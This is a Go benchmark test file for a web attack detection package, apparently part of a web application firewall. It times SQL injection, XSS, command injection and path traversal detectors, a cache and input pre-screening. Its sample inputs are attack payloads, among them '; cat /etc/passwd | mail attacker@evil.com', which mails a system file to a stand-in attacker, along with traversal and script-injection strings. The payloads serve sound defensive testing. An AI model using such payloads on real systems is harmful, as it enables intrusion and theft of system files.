package detector

import (
	"net/http"
	"strings"
	"testing"
	"time"
)

// ==================== 完整检测链路 ====================

func BenchmarkDetectRequestWithBody(b *testing.B) {
	m := NewManager()
	req, _ := http.NewRequest("POST", "/api/login?user=admin", strings.NewReader("user=admin' OR 1=1--&pass=test"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	body := "user=admin' OR 1=1--&pass=test"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.DetectRequestWithBody(req, body)
	}
}

func BenchmarkDetectRequest(b *testing.B) {
	m := NewManager()
	req, _ := http.NewRequest("GET", "/api/data?id=123", nil)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.DetectRequest(req)
	}
}

func BenchmarkDetectRequest_CleanInput(b *testing.B) {
	m := NewManager()
	req, _ := http.NewRequest("GET", "/api/users?page=1&size=20&sort=name", nil)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.DetectRequest(req)
	}
}

func BenchmarkDetectRequest_MultipleAttacks(b *testing.B) {
	m := NewManager()
	req, _ := http.NewRequest("POST", "/search?q=<script>alert(1)</script>&id=1' OR 1=1--", nil)
	req.Header.Set("Referer", "../../../etc/passwd")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.DetectRequestWithBody(req, "cmd=|cat /etc/passwd")
	}
}

// ==================== 单检测器 ====================

func BenchmarkSQLInjectionDetect(b *testing.B) {
	d := NewSQLInjectionDetector()
	input := "1' OR '1'='1'-- UNION SELECT * FROM users"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkSQLInjectionDetect_Clean(b *testing.B) {
	d := NewSQLInjectionDetector()
	input := "hello world normal text content"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkSQLInjectionDetectRequest(b *testing.B) {
	d := NewSQLInjectionDetector()
	hdr := map[string][]string{"User-Agent": {"Mozilla/5.0"}}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.DetectRequest("POST", "/api/login", "", "user=admin' OR 1=1--", hdr)
	}
}

func BenchmarkXSSDetect(b *testing.B) {
	d := NewXSSDetector()
	input := "<script>alert('xss')</script>"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkXSSDetect_Clean(b *testing.B) {
	d := NewXSSDetector()
	input := "hello world normal content without any html"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkXSSDetect_EncodedBypass(b *testing.B) {
	d := NewXSSDetector()
	input := "<scr ipt>document.cookie</scr ipt>"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkCommandInjectionDetect(b *testing.B) {
	d := NewCommandInjectionDetector()
	input := "; cat /etc/passwd | mail attacker@evil.com"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkCommandInjectionDetect_Clean(b *testing.B) {
	d := NewCommandInjectionDetector()
	input := "hello world normal text content"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkPathTraversalDetect(b *testing.B) {
	d := NewPathTraversalDetector()
	input := "../../../etc/passwd"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkPathTraversalDetect_Clean(b *testing.B) {
	d := NewPathTraversalDetector()
	input := "/api/users/123/profile"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

func BenchmarkPathTraversalDetect_Encoded(b *testing.B) {
	d := NewPathTraversalDetector()
	input := "..%2f..%2f..%2fetc%2fpasswd"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(input)
	}
}

// ==================== 优化组件 ====================

func BenchmarkRiskPreScreening(b *testing.B) {
	combined := "SELECT * FROM users WHERE id=1 OR 1=1--"
	lower := strings.ToLower(combined)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		preScreenRiskChars(combined, lower)
	}
}

func BenchmarkRiskPreScreening_LongInput(b *testing.B) {
	combined := "GET /api/users?id=1'+OR+1=1--&name=<script>alert(1)</script>|`cat /etc/passwd` HTTP/1.1\r\nHost: example.com\r\nCookie: session=abc123"
	lower := strings.ToLower(combined)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		preScreenRiskChars(combined, lower)
	}
}

func BenchmarkRiskPreScreening_CleanInput(b *testing.B) {
	combined := "GET /api/users?page=1&size=20&sort=name HTTP/1.1 Host: example.com"
	lower := strings.ToLower(combined)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		preScreenRiskChars(combined, lower)
	}
}

func BenchmarkRiskPreScreening_AllFlags(b *testing.B) {
	combined := "'; <script>|`cat`\r\n.."
	lower := strings.ToLower(combined)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		preScreenRiskChars(combined, lower)
	}
}

func BenchmarkBuildDetectionInput(b *testing.B) {
	hdr := http.Header{}
	hdr.Set("Content-Type", "application/x-www-form-urlencoded")
	hdr.Set("Cookie", "session=abc123; user=john")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		buildDetectionInput("/api/login", "user=admin", "pass=test123", hdr)
	}
}

func BenchmarkBuildDetectionInput_NoCookie(b *testing.B) {
	hdr := http.Header{}
	hdr.Set("Content-Type", "application/json")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		buildDetectionInput("/api/data", "id=123", "", hdr)
	}
}

func BenchmarkBuildDetectionInput_OnlyPath(b *testing.B) {
	hdr := http.Header{}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		buildDetectionInput("/api/users/123", "", "", hdr)
	}
}

func BenchmarkDetectionResultPool(b *testing.B) {
	b.Run("pool", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			ptr := acquireResults()
			releaseResults(ptr)
		}
	})
	b.Run("make", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_ = make([]DetectionResult, 0, 4)
		}
	})
}

func BenchmarkDetectionResultPool_WithAppend(b *testing.B) {
	b.Run("pool", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			ptr := acquireResults()
			*ptr = append(*ptr, DetectionResult{Detected: true, AttackType: "sql_injection", Confidence: 0.7})
			*ptr = append(*ptr, DetectionResult{Detected: true, AttackType: "xss", Confidence: 0.7})
			releaseResults(ptr)
		}
	})
	b.Run("make", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			s := make([]DetectionResult, 0, 4)
			s = append(s, DetectionResult{Detected: true, AttackType: "sql_injection", Confidence: 0.7})
			s = append(s, DetectionResult{Detected: true, AttackType: "xss", Confidence: 0.7})
			_ = s
		}
	})
}

func BenchmarkIsDetectorEnabledAtomic(b *testing.B) {
	m := NewManager()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.IsDetectorEnabled("sql_injection")
	}
}

func BenchmarkIsDetectorEnabledAtomic_MultipleLookups(b *testing.B) {
	m := NewManager()
	detectors := []string{"sql_injection", "xss", "command_injection", "path_traversal", "header_injection"}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, name := range detectors {
			m.IsDetectorEnabled(name)
		}
	}
}

// ==================== 缓存命中/未命中 ====================

func BenchmarkDetectionCacheHit(b *testing.B) {
	cache := NewDetectionCache(4096, 60*time.Second, 128)
	key := cache.computeCacheKey("GET", "/api/data", "id=123", "")
	results := []DetectionResult{
		{Detected: false, AttackType: "", Confidence: 0},
	}
	cache.Put(key, results)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cache.Get(key)
	}
}

func BenchmarkDetectionCacheMiss(b *testing.B) {
	cache := NewDetectionCache(4096, 60*time.Second, 128)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cache.Get(uint64(i))
	}
}

func BenchmarkDetectionCachePut(b *testing.B) {
	cache := NewDetectionCache(4096, 60*time.Second, 128)
	results := []DetectionResult{
		{Detected: true, AttackType: "sql_injection", Pattern: "UNION SELECT", Location: "query", RuleID: 1, RuleDesc: "UNION注入", Confidence: 0.7},
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cache.Put(uint64(i%4096), results)
	}
}

func BenchmarkDetectionCacheComputeKey(b *testing.B) {
	cache := NewDetectionCache(4096, 60*time.Second, 128)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cache.computeCacheKey("POST", "/api/login", "user=admin", "pass=test123")
	}
}

// ==================== DetectString (简化接口) ====================

func BenchmarkDetectString_SQLInjection(b *testing.B) {
	m := NewManager()
	input := "1' OR '1'='1'-- UNION SELECT * FROM users"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.DetectString(input)
	}
}

func BenchmarkDetectString_Clean(b *testing.B) {
	m := NewManager()
	input := "hello world normal content"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.DetectString(input)
	}
}

// ==================== Manager 辅助方法 ====================

func BenchmarkManagerHasAttack(b *testing.B) {
	m := NewManager()
	results := []DetectionResult{
		{Detected: true, AttackType: "sql_injection", Confidence: 0.7},
		{Detected: true, AttackType: "xss", Confidence: 0.85},
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.HasAttack(results)
	}
}

func BenchmarkManagerAggregateScore(b *testing.B) {
	m := NewManager()
	results := []DetectionResult{
		{Detected: true, AttackType: "sql_injection", Confidence: 0.7},
		{Detected: true, AttackType: "xss", Confidence: 0.85},
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		m.AggregateScore(results)
	}
}
